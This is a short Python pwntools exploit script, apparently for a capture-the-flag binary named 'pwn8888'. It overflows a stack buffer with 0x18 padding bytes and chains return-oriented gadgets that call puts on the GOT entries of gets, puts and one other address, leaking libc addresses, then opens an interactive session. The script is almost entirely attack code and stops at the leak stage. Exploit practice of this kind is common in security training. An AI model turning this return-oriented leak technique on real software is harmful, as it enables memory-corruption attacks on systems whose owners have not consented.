from pwn import *

context.log_level = "debug"
#context.terminal = ["qterminal", "-e"]

p = process("./pwn8888")
#gdb.attach(p)
elf = ELF("./pwn8888")
libc = elf.libc
puts_plt = elf.plt["puts"]
#
puts_got = elf.got["puts"]
gets_got = elf.got["gets"]
libc_start_main_got = elf.got["__libc_start_main"]
payload = (
    b"a" * 0x18
    + p64(0x400763)
    + p64(gets_got)#
    + p64(puts_plt)
    + p64(0x400763)
    + p64(0x400784)#
    + p64(puts_plt)
    + p64(0x400763)
    + p64(puts_got)#
    + p64(puts_plt)
)
print("pid" + str(proc.pidof(p)))
#pause()
p.sendline(payload)
p.interactive()
